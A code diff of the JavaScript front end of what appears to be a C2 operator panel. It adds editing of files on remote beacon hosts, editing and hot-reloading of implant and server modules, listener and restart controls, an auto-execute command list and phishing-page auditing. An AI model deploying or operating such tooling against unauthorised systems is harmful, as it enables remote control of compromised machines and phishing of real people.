-                for (let j = results.length - 1; j >= 0; j--) {
-                    if (results[j].task_id === taskId) { hit = results[j]; break; }
-                }
-            } else if (results.length) {
-                hit = results[results.length - 1];
-            }
-            if (!hit) continue;
-            if (hit.error) { status.textContent = '✗ 执行错误: ' + hit.error; return; }
-            const outTxt = hit.output || '';
-            // 目标文件不存在 → 转新建模式: 内容留空, 保存时自动创建
-            if (/^\(not found or not a file:/.test(outTxt)) {
-                document.getElementById('fe-content').value = '';
-                status.textContent = '✓ 文件不存在——填写内容后保存将新建该文件';
-                return;
-            }
-            document.getElementById('fe-content').value = outTxt;
-            status.textContent = '✓ 已加载 (' + outTxt.length + ' 字符)';
-            return;
-        } catch (e) { /* 轮询继续 */ }
-    }
-    status.textContent = '✗ 等待超时(30s)，请查看终端结果';
-}
-async function fileEditSave() {
-    const bid = document.getElementById('fe-beacon').value;
-    const path = document.getElementById('fe-path').value.trim();
-    const content = document.getElementById('fe-content').value;
-    if (!bid || !path) { fs3Alert('请选择 Beacon 并填写文件路径'); return; }
-    const status = document.getElementById('fe-status');
-    status.textContent = '保存中...';
-    try {
-        const resp = await fetch('/api/c2/file-edit', {method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({action: 'write', beacon_id: bid, path: path, content: content})});
-        const data = await resp.json();
-        status.textContent = (data.ok ? '✓ ' : '✗ ') + (data.message || data.error || '');
-    } catch (e) { status.textContent = '✗ 请求失败: ' + e.message; }
-}
-(function() {
-    const m = document.getElementById('file-edit-modal');
-    if (m) m.addEventListener('click', function(e) { if (e.target === this) closeFileEditModal(); });
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'Escape') {
-            const mm = document.getElementById('file-edit-modal');
-            if (mm && mm.style.display !== 'none') closeFileEditModal();
-        }
-    });
-})();
-
-async function saveListenerConfig() {
-    const payload = {};
-    ['lc-server_port', 'lc-client_port',
-     'lc-client_timeout'].forEach(function(id) {
-        const raw = document.getElementById(id).value.trim();
-        const key = id.replace('lc-', '');
-        payload[key] = raw === '' ? 0 : parseInt(raw, 10);
-    });
-    const statusEl = document.getElementById('lc-status');
-    statusEl.textContent = '保存中...';
-    statusEl.style.color = 'var(--text-muted)';
-    try {
-        const resp = await fetch('/api/c2/listener-config', {method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(payload)});
-        const data = await resp.json();
-        statusEl.textContent = (data.ok ? '✓ ' : '✗ ') + (data.message || data.error || '');
-        statusEl.style.color = data.ok ? 'var(--success)' : 'var(--danger)';
-        if (data.ok) loadStatusDetail();
-    } catch (e) {
-        statusEl.textContent = '✗ 请求失败: ' + e.message;
-        statusEl.style.color = 'var(--danger)';
-    }
-}
-
-async function restartC2() {
-    if (!(await fs3Confirm('重启 C2 server？beacon 会自动重连(间隔约一个回连周期),当前待办任务保留。确认重启？'))) return;
-    const statusEl = document.getElementById('lc-status');
-    statusEl.textContent = '重启中...';
-    statusEl.style.color = 'var(--text-muted)';
-    try {
-        const resp = await fetch('/api/c2/restart', {method: 'POST'});
-        const data = await resp.json();
-        statusEl.textContent = (data.ok ? '✓ ' : '✗ ') + (data.message || data.error || '');
-        statusEl.style.color = data.ok ? 'var(--success)' : 'var(--danger)';
-        if (data.ok) { setTimeout(loadStatusDetail, 1500); }
-    } catch (e) {
-        statusEl.textContent = '✗ 请求失败: ' + e.message;
-        statusEl.style.color = 'var(--danger)';
-    }
-}
-
 // ══════════ 模块面板 ══════════
 let currentMtab = 'implant';
 function switchMtab(tab) {
@@ -2314,10 +2289,6 @@ function switchMtab(tab) {
     document.querySelectorAll('[data-mtab]').forEach(t => t.classList.toggle('active', t.dataset.mtab === tab));
     document.getElementById('mtab-implant').style.display = tab === 'implant' ? '' : 'none';
     document.getElementById('mtab-server').style.display = tab === 'server' ? '' : 'none';
-    document.getElementById('mtab-manage').style.display = tab === 'manage' ? '' : 'none';
-    document.getElementById('mtab-history').style.display = tab === 'history' ? '' : 'none';
-    if (tab === 'manage') loadModuleFiles();
-    if (tab === 'history') renderHistory();
     return false;
 }
 
@@ -2387,7 +2358,7 @@ async function openModuleModal(name) {
         .then(data => {
             if (!data.ok) { fs3Alert(data.error || '加载失败'); return; }
             const m = data.module;
-            currentModule = {name: m.name, type: 'implant'};
+            currentModule = {name: m.name, type: 'implant', filename: m.filename || ''};
             document.getElementById('mm-title').textContent = '植入模块 · ' + m.name + ' (' + m.type + ')';
             document.getElementById('mm-desc').textContent = m.desc || '（无描述）';
             document.getElementById('mm-params').innerHTML = m.type === 'python'
@@ -2396,34 +2367,89 @@ async function openModuleModal(name) {
                   '</tbody></table>' +
                   (m.result_processor ? '<div class="help-text" style="margin:6px 0 0;">结果处理器: <code>' + escapeHtml(m.result_processor) + '</code></div>' : '')
                 : '<p class="help-text">JSON 序列模块，共 ' + (m.steps || []).length + ' 步</p>';
-            document.getElementById('mm-code-wrap').style.display = m.code ? '' : 'none';
-            document.getElementById('mm-code').textContent = m.code || '';
+            const hasCode = !!m.code;
+            document.getElementById('mm-code-wrap').style.display = hasCode ? '' : 'none';
+            document.getElementById('mm-code').value = m.code || '';
+            document.getElementById('mm-code').style.display = 'none';       // 默认隐藏源码
+            document.getElementById('mm-save-btn').style.display = 'none';
+            document.getElementById('mm-code-ind').textContent = '▸ 点击展开';
             document.getElementById('mm-del-btn').style.display = '';
             document.getElementById('mm-srun-btn').style.display = 'none';
             document.getElementById('mm-output').style.display = 'none';
-            document.getElementById('module-modal').style.display = 'flex';
+            document.getElementById('module-modal').style.setProperty('display', 'flex', 'important');
         })
         .catch(e => fs3Alert('加载失败: ' + e.message));
 }
 
-function openServerModuleModal(name) {
-    const m = serverMods.find(x => x.name === name);
-    if (!m) return;
-    currentModule = {name: m.name, type: 'server'};
-    document.getElementById('mm-title').textContent = 'Server 模块 · ' + m.name;
-    document.getElementById('mm-desc').textContent = m.desc || '（无描述）';
-    document.getElementById('mm-params').innerHTML = (m.params || []).length
-        ? '<table class="table" style="font-size:0.8rem;"><thead><tr><th style="width:140px;">参数</th><th>说明</th></tr></thead><tbody>' +
-          m.params.map(p => '<tr><td class="mono">' + escapeHtml(p[0]) + '</td><td>' + escapeHtml(p[1] || '-') + '</td></tr>').join('') + '</tbody></table>'
-        : '<p class="help-text">无参数</p>';
-    document.getElementById('mm-code-wrap').style.display = 'none';
-    document.getElementById('mm-del-btn').style.display = 'none';
-    document.getElementById('mm-srun-btn').style.display = '';
-    document.getElementById('mm-output').style.display = 'none';
-    document.getElementById('module-modal').style.display = 'flex';
+async function openServerModuleModal(name) {
+    document.getElementById('mm-params').innerHTML = '';
+    document.getElementById('mm-code').value = '';
+    document.getElementById('mm-save-btn').style.display = 'none';
+    try {
+        const resp = await fetch('/api/c2/smodule/' + encodeURIComponent(name));
+        const data = await resp.json();
+        if (!data.ok) { fs3Alert(data.error || 'server 模块加载失败'); return; }
+        const m = data.module;
+        currentModule = {name: m.name, type: 'server', filename: m.name + '.py'};
+        document.getElementById('mm-title').textContent = 'Server 模块 · ' + m.name;
+        document.getElementById('mm-desc').textContent = m.desc || '（无描述）';
+        document.getElementById('mm-params').innerHTML = (m.params || []).length
+            ? '<table class="table" style="font-size:0.8rem;"><thead><tr><th style="width:140px;">参数</th><th>说明</th></tr></thead><tbody>' +
+              m.params.map(p => '<tr><td class="mono">' + escapeHtml(p[0]) + '</td><td>' + escapeHtml(p[1] || '-') + '</td></tr>').join('') + '</tbody></table>'
+            : '<p class="help-text">无参数</p>';
+        const hasCode = !!m.code;
+        document.getElementById('mm-code-wrap').style.display = hasCode ? '' : 'none';
+        document.getElementById('mm-code').value = m.code || '';
+        document.getElementById('mm-code').style.display = 'none';       // 默认隐藏源码
+        document.getElementById('mm-save-btn').style.display = 'none';
+        document.getElementById('mm-code-ind').textContent = '▸ 点击展开';
+        document.getElementById('mm-del-btn').style.display = 'none';
+        document.getElementById('mm-srun-btn').style.display = '';
+        document.getElementById('mm-output').style.display = 'none';
+        document.getElementById('module-modal').style.setProperty('display', 'flex', 'important');
+    } catch (e) {
+        fs3Alert('server 模块加载失败: ' + e.message);
+    }
 }
 
-function closeModuleModal() { document.getElementById('module-modal').style.display = 'none'; currentModule = null; }
+// 点击"模块源码"标题: 展开/收起源码正文(保存按钮随内容显隐)
+function toggleMmCode() {
+    const w = document.getElementById('mm-code-wrap');
+    if (!w || w.style.display === 'none') return;
+    const ta = document.getElementById('mm-code');
+    const btn = document.getElementById('mm-save-btn');
+    const ind = document.getElementById('mm-code-ind');
+    const open = ta.style.display !== 'none';
+    ta.style.display = open ? 'none' : '';
+    btn.style.display = open ? 'none' : '';
+    ind.textContent = open ? '▸ 点击展开' : '▾ 点击收起';
+}
+
+// 保存模块源码: implant 走 module/add(原名覆盖+热加载), server 走 smodule/save
+async function saveModuleSource() {
+    if (!currentModule) return;
+    const content = document.getElementById('mm-code').value;
+    if (!content.trim()) { fs3Alert('源码为空'); return; }
+    let api, payload;
+    if (currentModule.type === 'implant') {
+        api = '/api/c2/module/add';
+        payload = {filename: currentModule.filename, content: content};
+    } else {
+        api = '/api/c2/smodule/save';
+        payload = {name: currentModule.name, content: content};
+    }
+    try {
+        const resp = await fetch(api, {method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)});
+        const data = await resp.json();
+        fs3Alert(data.ok ? ('✓ ' + (data.message || '已保存')) : ('✗ ' + (data.error || data.message || '保存失败')));
+        if (data.ok) { loadModules(); }
+    } catch (e) {
+        fs3Alert('✗ 保存失败: ' + e.message);
+    }
+}
+
+function closeModuleModal() { document.getElementById('module-modal').style.setProperty('display', 'none', 'important'); currentModule = null; }
 
 function mmArgs() { return (document.getElementById('mm-args').value || '').trim().split(/\s+/).filter(Boolean); }
 function mmPlatform() { return document.getElementById('mm-platform').value; }
@@ -2475,47 +2501,10 @@ async function deleteModuleFromModal() {
     const resp = await fetch('/api/c2/module/' + encodeURIComponent(currentModule.name), {method: 'DELETE'});
     const data = await resp.json();
     fs3Alert(data.message || (data.ok ? '已删除' : '删除失败'));
-    if (data.ok) { closeModuleModal(); loadModules(); loadModuleFiles(); }
+    if (data.ok) { closeModuleModal(); loadModules(); }
 }
 
 // ══════════ 模块管理（添加/删除） ══════════
-async function addModuleFile() {
-    const filename = document.getElementById('mm-add-filename').value.trim();
-    const content = document.getElementById('mm-add-content').value;
-    const statusEl = document.getElementById('mm-add-status');
-    if (!filename || !content) { statusEl.textContent = '文件名和内容不能为空'; statusEl.style.color = 'var(--danger)'; return; }
-    statusEl.textContent = '提交中...'; statusEl.style.color = 'var(--text-muted)';
-    const resp = await fetch('/api/c2/module/add', {method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({filename: filename, content: content})});
-    const data = await resp.json();
-    statusEl.textContent = (data.ok ? '✓ ' : '✗ ') + (data.message || data.error || '');
-    statusEl.style.color = data.ok ? 'var(--success)' : 'var(--danger)';
-    if (data.ok) { document.getElementById('mm-add-filename').value = ''; document.getElementById('mm-add-content').value = ''; loadModules(); loadModuleFiles(); }
-}
-
-async function loadModuleFiles() {
-    try {
-        const resp = await fetch('/api/c2/module-files');
-        const data = await resp.json();
-        if (!data.ok) return;
-        const box = document.getElementById('module-manage-list');
-        if (!data.files || !data.files.length) { box.innerHTML = '<span class="empty">无模块文件</span>'; return; }
-        box.innerHTML = data.files.map(f =>
-            '<div class="mgr-file"><span class="mod-name">' + escapeHtml(f.filename) + '</span>' +
-            '<span class="mono" style="color:var(--text-faint);font-size:0.7rem;">' + escapeHtml(f.name) + '</span>' +
-            '<span style="flex:1;"></span>' +
-            '<button class="btn btn-sm btn-danger" onclick="deleteModuleFile(\'' + escapeHtml(f.filename) + '\')">删除</button></div>').join('');
-    } catch (e) {}
-}
-
-async function deleteModuleFile(filename) {
-    if (!(await fs3Confirm('确认删除模块文件 ' + filename + ' ？'))) return;
-    const resp = await fetch('/api/c2/module/' + encodeURIComponent(filename), {method: 'DELETE'});
-    const data = await resp.json();
-    fs3Alert(data.message || (data.ok ? '已删除' : '删除失败'));
-    if (data.ok) { loadModuleFiles(); loadModules(); }
-}
-
 // ══════════ 自动执行列表(条目化:添加/删除/拖动排序,自动保存) ══════════
 let autoCmds = [];
 
@@ -2536,6 +2525,7 @@ function renderAutoCmds() {
     if (!autoCmds.length) {
         listEl.innerHTML = '<div class="auto-empty">暂无自动执行命令,在上方输入后点「添加」</div>';
         setAutoStatus('共 0 条');
+        syncHistHeight();   // 空态高度(仅提示行)也同步给历史栏
         return;
     }
     listEl.innerHTML = autoCmds.map(function(cmd, i) {
@@ -2546,6 +2536,7 @@ function renderAutoCmds() {
             '</div>';
     }).join('');
     setAutoStatus('共 ' + autoCmds.length + ' 条 · 从上到下顺序执行');
+    syncHistHeight();   // auto 列表变化后,历史命令栏高度跟随
 }
 
 function setAutoStatus(msg, ok) {
@@ -4266,7 +4257,7 @@ async function phSaveConfig() {
 // ── 审计 ──
 
 async function openPhAuditModal() {
-    document.getElementById('ph-audit-modal').style.display = 'flex';
+    document.getElementById('ph-audit-modal').style.setProperty('display', 'flex', 'important');
     var box = document.getElementById('ph-audit-list');
     box.innerHTML = '加载中...';
     try {
@@ -4282,7 +4273,7 @@ async function openPhAuditModal() {
 }
 
 function closePhAuditModal() {
-    document.getElementById('ph-audit-modal').style.display = 'none';
+    document.getElementById('ph-audit-modal').style.setProperty('display', 'none', 'important');
 }
 
 // ── 钓鱼页面轮询(切到该 tab 后每 3s) ──
